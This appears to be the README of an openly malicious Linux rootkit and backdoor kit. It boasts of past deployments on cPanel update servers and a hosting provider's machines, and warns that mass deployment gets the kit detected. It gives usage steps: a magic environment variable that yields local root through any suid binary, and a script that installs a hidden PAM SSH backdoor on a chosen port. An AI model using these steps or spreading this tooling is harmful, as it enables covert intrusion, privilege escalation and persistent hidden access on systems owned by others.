This is experimental code.
Do not rely on it for strong anonymity.
Do not rely on it for strong invisibility.

Also don't mass-deploy it or pop it on cPanel Inc's update boxes like last time
AND DON'T FUCKING PUT IT ON ALL OF SINGLEHOP AGAIN.
Like, seriously, who does that with somebody else's malware?
Don't do that. That gets it detected.
This is why we can't have nice things.
This is why stuff like this commit happens.

The GUI installer's pretty straightforward.

Dependencies: OpenSSL binaries, libs, headers (or a smart user)
Password hashing format is Whirlpool. There's a tool included in utils.
The installer actually uses this, but your mileage may vary compiling it
on strange systems. If you run into issues just edit the installer script a bit.
Bring a static-compiled pwgen and unfuck if you're desperate to get it working

To get root from local:

YOUR_ENV_VAR=1 [any suid bin]

New PAM backdoor: bash utils/ssh-hidden.sh ip user hideport
Simple enough, right?
If you still need help then fuck you.
